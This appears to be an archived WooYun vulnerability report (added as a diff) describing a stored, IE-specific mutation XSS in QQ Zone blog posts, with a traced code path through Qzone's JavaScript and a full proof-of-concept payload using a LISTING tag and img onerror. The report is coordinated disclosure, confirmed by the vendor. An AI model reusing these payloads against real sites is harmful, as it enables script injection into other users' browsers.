@@ -1,0 +1,328 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ空间某功能缺陷导致日志存储型XSS - 15  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ空间某功能缺陷导致日志存储型XSS - 15  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2014-02-20 16:43</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-03-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-03-13：	细节向普通白帽子公开<br/>
+									2014-03-23：	细节向实习白帽子公开<br/>
+									2014-04-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一枚mXSS（来自老外的叫法），算是比较新鲜的玩意。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">首先声明这是一个IE特异的XSS问题。为了理解这个问题，首先看下面的代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div id=&quot;testa&quot;&gt;xx&lt;/div&gt;<br />
+&lt;div id=&quot;testb&quot;&gt;xx&lt;/div&gt;<br />
+&lt;script&gt;<br />
+var m=&quot;&lt;LISTING&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/LISTING&gt;&quot;;<br />
+var x=document.getElementById(&quot;testa&quot;);<br />
+x.innerHTML=m;<br />
+<br />
+var html=x.innerHTML;<br />
+alert(html); //弹出 &lt;LISTING&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/LISTING&gt;<br />
+<br />
+document.getElementById(&quot;testb&quot;).innerHTML = html;<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看出 &lt;LISTING&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/LISTING&gt; 是一段无害的代码，<br />
+<br />
+<br />
+<br />
+但是进入x的innerHTML后，再取出x的innerHTML时，变成了有害的HTML代码<br />
+<br />
+<br />
+<br />
+&lt;LISTING&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/LISTING&gt;<br />
+<br />
+<br />
+<br />
+当这个有害的代码再次进入其它元素的innerHTML时，就会触发XSS。<br />
+<br />
+<br />
+<br />
+------------------------------<br />
+<br />
+<br />
+<br />
+为了利用上面这种情况，我们需要假想以下流程。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/20163530895b25803ffccc15bb4559f9333f98b8.jpg" target="_blank"><img src="../images/20163530895b25803ffccc15bb4559f9333f98b8.jpg" alt="111111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+看起来有点繁琐，那么是否可以找到这样的场景呢？这里我就拿QQ空间日志为例（对QQ空间的JS代码熟悉点。。）<br />
+<br />
+<br />
+<br />
+1. 我们选择模板日志进行发布日志，在日志内容里插入上面提到的那段代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;LISTING&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&lt;/LISTING&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看返回的日志内容得出结论是：腾讯的过滤器并不会过滤listing标签。<br />
+<br />
+<br />
+<br />
+2. 第一步是前提，接着我们就要找 innerHTML的一进一出。这里我定位到/qzone/app/blog/v6/script/blog_content.js中的Title.parse<br />
+<br />
+<br />
+<br />
+</p><pre><code>Title.parse = function(content) {<br />
+    var result = [];<br />
+    var contentContainer = document.createElement(&quot;div&quot;);<br />
+    contentContainer.innerHTML = content;<br />
+    var titleArr = content.match(/&lt;div[^&gt;]*?name=&quot;title&quot;[\s|\S]*?\/div&gt;/ig);<br />
+    if ( !! titleArr &amp;&amp; titleArr.length &gt; 0) {<br />
+        for (var i = 0, j = titleArr.length; i &lt; j; i++) {<br />
+            var textDiv = document.createElement(&quot;div&quot;);<br />
+            textDiv.innerHTML = titleArr[i];<br />
+            result.push(textDiv.childNodes[0]);<br />
+        }<br />
+    }<br />
+    return result;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在这段代码中，content是我们可控的日志内容，titleArr是正则匹配后的结果，也是我们可控的内容。接着在for循环中，可以看到titleArr的内容进入了 textDiv.innerHTML，这正是我们上面所绘制步骤中的第一步。这些textDiv的子节点被push到result数组中返回。<br />
+<br />
+<br />
+<br />
+3. 我们看看Title.parse的返回值去了哪里？相关代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>...<br />
+ TemplateBlogParser.titles = Title.parse(content);<br />
+...</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 继续跟踪 .titles  ，<br />
+<br />
+<br />
+<br />
+</p><pre><code>case &quot;Title&quot;:<br />
+	if (TemplateBlogParser.titles.length == 0) {<br />
+		break;<br />
+	}<br />
+	var title = TemplateBlogParser.titles.shift();<br />
+	if (title.innerHTML != &quot;&quot;) {<br />
+		aData.content = title.innerHTML;<br />
+	}<br />
+	break;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们可以看到title.innerHTML被取出放入到了 aData.content 变量中。这样一来，就完成了我们所绘步骤图中的第二步。<br />
+<br />
+<br />
+<br />
+5. 希望就在前方，我们要继续看这个 aData.content是否会进入 innerHTML而输出到DOM中。<br />
+<br />
+<br />
+<br />
+最后输出到页面中的是 TemplateBlogParser.parse 函数的返回值，而该函数的返回值来自以下代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>case &quot;view&quot;:<br />
+	return aObj.getContentHTML();<br />
+	break;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+因为我们是利用的Title, 其中aObj对应的是Title &quot;类&quot;，我们查看Title的getContentHTML函数。<br />
+<br />
+<br />
+<br />
+</p><pre><code>Title.prototype.getContentHTML = function() {<br />
+    var html = [&#039;&lt;div class=&quot;blog_module_tit&quot;&gt;&#039;, this.data.content, &#039;&lt;/div&gt;&#039;].join(&quot;&quot;);<br />
+    return html;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，我们的data.content被join拼接并返回，回溯来看，最终到达TemplateBlogParser.parse的返回值中。而该返回值，最终使用以下代码，进入innerHTML.<br />
+<br />
+<br />
+<br />
+</p><pre><code>//g_oBlogContent 中包含有我们的代码<br />
+g_oContentDom.innerHTML = g_oBlogContent;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6. 因此，我们可以简单的构造利用代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div class=&quot;blog_details_20120222&quot;&gt;&lt;div name=&quot;title&quot;&gt;xxxxxxx&lt;/div&gt;&lt;div name=&quot;title&quot;&gt;&lt;LISTING&gt;&amp;lt;img src=x onerror=alert(22)&amp;gt;&lt;/LISTING&gt; &lt;/div&gt;&lt;div name=&quot;text&quot; style=&quot;font-size:14px&quot;&gt;bbbbbbb&lt;/div&gt;&lt;img name=&quot;pic&quot; style=&quot;display:block;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;图片&quot; position=&quot;0_0&quot; isDefaultPhoto=&quot;1&quot; rotation=&quot;0&quot; scale=&quot;0&quot; src=&quot;http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_1.jpg&quot; /&gt;&lt;div name=&quot;title&quot;&gt;ccccc&lt;/div&gt;&lt;div name=&quot;text&quot; style=&quot;font-size:14px&quot;&gt;cccccc&lt;/div&gt;&lt;img name=&quot;pic&quot; style=&quot;display:block;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;图片&quot; position=&quot;0_0&quot; isDefaultPhoto=&quot;1&quot; rotation=&quot;0&quot; scale=&quot;0&quot; src=&quot;http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_2.jpg&quot; /&gt;&lt;div name=&quot;title&quot;&gt;ddddddd&lt;/div&gt;&lt;div name=&quot;text&quot; style=&quot;font-size:14px&quot;&gt;dddddd&lt;/div&gt;&lt;img name=&quot;pic&quot; style=&quot;display:block;&quot; width=&quot;200&quot; height=&quot;200&quot; alt=&quot;图片&quot; position=&quot;0_0&quot; isDefaultPhoto=&quot;1&quot; rotation=&quot;0&quot; scale=&quot;0&quot; src=&quot;http://edu.qzs.qq.com/qzone/space_item/orig/10/97754/module_3.jpg&quot; /&gt;&lt;div name=&quot;MultiImageController&quot; data=&quot;&quot;&gt;&lt;/div&gt;&lt;div name=&quot;music&quot; data=&quot;undefined|||&quot;&gt;&lt;object style=&quot;display:none&quot; ubb=&quot;undefined|||&quot; class=&quot;blog_music none&quot;&gt;&lt;/object&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+效果见漏洞证明。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">win7 + ie8<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/20163553b31e090ef9eed7d6f83018aa52c890a3.jpg" target="_blank"><img src="../images/20163553b31e090ef9eed7d6f83018aa52c890a3.jpg" alt="22222.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">考虑过滤 listing 标签，不过可能会有点治标不治本。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-051536" title="QQ空间某功能缺陷导致日志存储型XSS - 15">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-02-21 15:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="51536";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
